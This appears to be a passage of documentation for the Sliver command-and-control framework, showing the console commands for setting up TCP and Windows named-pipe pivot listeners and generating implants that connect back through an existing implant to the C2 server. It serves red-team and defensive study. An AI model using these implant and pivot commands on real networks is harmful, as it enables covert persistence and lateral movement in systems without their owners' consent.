Pivots allow routing implant traffic through other implants. This can be useful in environments that donâ€™t have any outbound access, but are reachable from other parts of the network that you have access to.

Sliver supports two types of pivots: TCP, which can be used on all operating systems, and named pipes, which are Windows-only.

In both cases the workflow is relatively similar, as a first step, select a session and set up a pivot listener.

```bash
[server] sliver (INNER_GO-KART) > pivots tcp

[*] Started tcp pivot listener :9898 with id 1

[server] sliver (INNER_GO-KART) > pivots

 ID   Protocol   Bind Address   Number Of Pivots
==== ========== ============== ==================
  1   TCP        :9898                         0
```

The listening port and interface can be configured during creation.

The next step is to generate a payload that will connect to our listener.

```bash
[server] sliver (INNER_GO-KART) > generate --tcp-pivot 127.0.0.1 --os macos

[*] Generating new darwin/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 12s
[*] Implant saved to /Users/tester/tools/VALUABLE_SICK
```

Executing this payload will cause it to connect back through our original implant and then back to our C2 server.

```asciinema
{"src": "/asciinema/tcppivot.cast", "cols": "132", "rows": "14", "idleTimeLimit": 8}
```

As mentionned before named pipe pivots use a similar process, first you need to create a listener:

```bash
[server] sliver (WARM_DRIVEWAY) > pivots named-pipe --bind foobar

[*] Started named pipe pivot listener \\.\pipe\foobar with id 1

```

You can then generate an implant connecting to it 

```bash
sliver > generate --os windows --debug --skip-symbols --named-pipe ./pipe/foobar

[*] Generating new windows/amd64 implant binary
[*] Build completed in 1s
[*] Implant saved to /Users/tester/code/sliver/PROPER_SING.exe
```
